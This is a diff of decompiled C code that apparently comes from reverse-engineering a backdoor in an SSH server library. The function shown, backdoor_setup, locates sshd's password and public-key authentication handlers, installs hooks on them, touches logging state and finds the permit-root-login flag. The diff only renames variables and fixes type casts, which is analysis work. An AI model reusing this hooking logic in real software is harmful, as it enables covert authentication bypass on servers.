@@ -83,8 +83,8 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   u8 reg_lower;
   u8 reg_upper;
   u8 *sshd_code_end_ptr;
-  sshd_monitor_func_t *mm_answer_keyverify_sym;
-  int search_hit_count;
+  sshd_monitor_func_t *authprobe_func_start;
+  int auth_root_vote_count;
   u8 zero_seed;
   string_references_t string_refs;
   backdoor_shared_libraries_data_t shared_maps;
@@ -216,8 +216,9 @@ LAB_00105951:
           (local_b10->sshd_ctx).mm_answer_authpassword_hook =
                params->shared_globals->authpassword_hook_entry;
           mm_answer_keyverify_fn = params->hook_ctx->mm_answer_keyverify_entry;
-          (local_b10->sshd_ctx).mm_answer_keyallowed = params->hook_ctx->mm_answer_keyallowed_entry;
-          (local_b10->sshd_ctx).mm_answer_keyverify = mm_answer_keyverify_fn;
+          (local_b10->sshd_ctx).mm_answer_keyallowed_hook =
+               params->hook_ctx->mm_answer_keyallowed_entry;
+          (local_b10->sshd_ctx).mm_answer_keyverify_hook = mm_answer_keyverify_fn;
           sshd_log_ctx = &local_b10->sshd_log_ctx;
           for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
             sshd_log_ctx->logging_disabled = FALSE;
@@ -388,11 +389,11 @@ LAB_00105951:
                                    (XREF_mm_answer_authpassword,
                                     &sshd_ctx_cursor->mm_answer_authpassword_start,
                                     &sshd_ctx_cursor->mm_answer_authpassword_end,
-                                    &sshd_ctx_cursor->mm_answer_authpassword_ptr,libcrypto_info,
+                                    &sshd_ctx_cursor->mm_answer_authpassword_slot,libcrypto_info,
                                     &local_980.sshd_string_refs,ctx), BVar26 == FALSE)) {
-              sshd_ctx_cursor->mm_answer_authpassword_start = (void *)0x0;
+              sshd_ctx_cursor->mm_answer_authpassword_start = (sshd_monitor_func_t *)0x0;
               sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
-              sshd_ctx_cursor->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
+              sshd_ctx_cursor->mm_answer_authpassword_slot = (sshd_monitor_func_t *)0x0;
             }
             local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x7b8);
             pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a98,(void *)0x0);
@@ -401,34 +402,34 @@ LAB_00105951:
               BVar26 = elf_find_function_pointer
                                  (XREF_mm_answer_keyallowed,&sshd_ctx_cursor->mm_answer_keyallowed_start,
                                   &sshd_ctx_cursor->mm_answer_keyallowed_end,
-                                  &sshd_ctx_cursor->mm_answer_keyallowed_ptr,libcrypto_info,
+                                  &sshd_ctx_cursor->mm_answer_keyallowed_slot,libcrypto_info,
                                   &local_980.sshd_string_refs,ctx);
               if (BVar26 == FALSE) {
                 sshd_ctx_cursor->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                 sshd_ctx_cursor->mm_answer_keyallowed_end = (void *)0x0;
-                sshd_ctx_cursor->mm_answer_keyallowed_ptr = (void *)0x0;
+                sshd_ctx_cursor->mm_answer_keyallowed_slot = (sshd_monitor_func_t *)0x0;
               }
               else {
                 BVar26 = elf_find_function_pointer
                                    (XREF_mm_answer_keyverify,&sshd_ctx_cursor->mm_answer_keyverify_start,
                                     &sshd_ctx_cursor->mm_answer_keyverify_end,
-                                    &sshd_ctx_cursor->mm_answer_keyverify_ptr,libcrypto_info,
+                                    &sshd_ctx_cursor->mm_answer_keyverify_slot,libcrypto_info,
                                     &local_980.sshd_string_refs,ctx);
                 if (BVar26 == FALSE) {
-                  sshd_ctx_cursor->mm_answer_keyverify_start = (void *)0x0;
+                  sshd_ctx_cursor->mm_answer_keyverify_start = (sshd_monitor_func_t *)0x0;
                   sshd_ctx_cursor->mm_answer_keyverify_end = (void *)0x0;
-                  sshd_ctx_cursor->mm_answer_keyverify_ptr = (void *)0x0;
+                  sshd_ctx_cursor->mm_answer_keyverify_slot = (sshd_monitor_func_t *)0x0;
                 }
               }
             }
-            if ((sshd_ctx_cursor->mm_answer_authpassword_start != (void *)0x0) ||
+            if ((sshd_ctx_cursor->mm_answer_authpassword_start != (sshd_monitor_func_t *)0x0) ||
                (sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
               sshd_ctx_ptr = (local_b10->global_ctx).sshd_ctx;
               local_9d8.instruction = (u8 *)0x0;
-              mm_answer_keyverify_sym = (sshd_monitor_func_t *)sshd_ctx_ptr->mm_answer_authpassword_start;
-              if (mm_answer_keyverify_sym == (sshd_monitor_func_t *)0x0) {
-                mm_answer_keyverify_sym = sshd_ctx_ptr->mm_answer_keyallowed_start;
-                if (mm_answer_keyverify_sym == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
+              authprobe_func_start = sshd_ctx_ptr->mm_answer_authpassword_start;
+              if (authprobe_func_start == (sshd_monitor_func_t *)0x0) {
+                authprobe_func_start = sshd_ctx_ptr->mm_answer_keyallowed_start;
+                if (authprobe_func_start == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
                 payload_end = (u8 *)sshd_ctx_ptr->mm_answer_keyallowed_end;
               }
               else {
@@ -452,16 +453,16 @@ LAB_00105951:
                     BVar26 = elf_contains_vaddr_relro(libcrypto_info,(u64)mem_address,8,1);
                     if ((BVar26 != FALSE) &&
                        (BVar26 = find_instruction_with_mem_operand_ex
-                                           ((u8 *)mm_answer_keyverify_sym,payload_end,(dasm_ctx_t *)0x0,0x109,
+                                           ((u8 *)authprobe_func_start,payload_end,(dasm_ctx_t *)0x0,0x109,
                                             mem_address), BVar26 != FALSE)) {
-                      data_segment = sshd_ctx_cursor->mm_answer_authpassword_start;
-                      ((local_b10->global_ctx).sshd_ctx)->STR_unknown_ptr = (char *)mem_address;
-                      if (data_segment != (void *)0x0) {
+                      authprobe_func_start = sshd_ctx_cursor->mm_answer_authpassword_start;
+                      ((local_b10->global_ctx).sshd_ctx)->auth_log_fmt_reloc = (char *)mem_address;
+                      if (authprobe_func_start != (sshd_monitor_func_t *)0x0) {
                         sshd_ctx_cursor->have_mm_answer_authpassword = TRUE;
                       }
                       if ((sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
                          (sshd_ctx_cursor->have_mm_answer_keyallowed = TRUE,
-                         sshd_ctx_cursor->mm_answer_keyverify_start != (void *)0x0)) {
+                         sshd_ctx_cursor->mm_answer_keyverify_start != (sshd_monitor_func_t *)0x0)) {
                         sshd_ctx_cursor->have_mm_answer_keyverify = TRUE;
                       }
                       tls_slot = (int *)find_addr_referenced_in_mov_instruction
@@ -521,7 +522,7 @@ LAB_001064b8:
   if (tls_slot != (int *)0x0) {
     if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
        ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
-      search_hit_count = 0;
+      auth_root_vote_count = 0;
       loop_idx = 0;
       *(uint *)&local_9d8.instruction_size = 0x10;
       local_9d8.instruction = (u8 *)0xf0000000e;
@@ -532,7 +533,7 @@ LAB_001064b8:
         if (sshd_code_end_ptr != (u8 *)0x0) {
           payload_end = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
                           [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_end;
-          search_hit_count = search_hit_count + 1;
+          auth_root_vote_count = auth_root_vote_count + 1;
           BVar26 = find_instruction_with_mem_operand(sshd_code_end_ptr,payload_end,(dasm_ctx_t *)0x0,tls_slot);
           if ((BVar26 != FALSE) ||
              (BVar26 = find_add_instruction_with_mem_operand
@@ -542,7 +543,7 @@ LAB_001064b8:
         }
         loop_idx = loop_idx + 1;
       } while (loop_idx != 3);
-      if ((search_hit_count != 0) && ((int)hooks == 0)) goto LAB_001065af;
+      if ((auth_root_vote_count != 0) && ((int)hooks == 0)) goto LAB_001065af;
     }
     ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = tls_slot;
   }
